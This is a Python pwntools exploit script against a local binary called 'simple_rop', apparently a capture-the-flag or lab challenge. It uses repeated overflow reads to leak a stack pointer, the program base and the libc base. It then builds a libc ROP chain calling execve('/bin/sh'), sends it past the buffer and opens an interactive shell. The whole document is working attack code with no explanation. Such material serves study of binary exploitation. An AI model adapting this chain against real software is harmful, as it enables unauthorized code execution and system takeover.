from pwn import *

context.arch = 'amd64'

p = process('./simple_rop')

#context.terminal = ["alacritty", "-e", "bash", "-c"]
#gdb.attach(p)

def leak(off, size):
    if size <= 0:
        return b''
    p.sendline(off*b'A')
    ans = p.recvline()
    assert ans[-1] == ord(b'\n')
    ans = ans[:-1]
    value = ans[off:off+size]
    if len(value) < size:
        value += b'\x00'
    off += len(value)
    size -= len(value)
    return value + leak(off, size)

leaked_rbp = u64(leak(0x20, 8))
print('leaked_rbp', hex(leaked_rbp))

leaked_1257 = u64(leak(0x28, 8))
base_prog = leaked_1257 - 0x1257

print('base_prog', hex(base_prog))

leaked_libc_25E08 = u64(leak(0x28+8+8, 8))
base_libc = leaked_libc_25E08 - 0x25E08

print('base_libc', hex(base_libc))

elf = ELF('libc.so.6')
elf.address = base_libc
rop = ROP(elf, base=leaked_rbp-8)

rop.execve(b'/bin/sh')

print(rop.dump())

p.sendline(0x20*b'A' + p64(leaked_rbp) + rop.chain())
p.sendline(b'')

p.interactive()
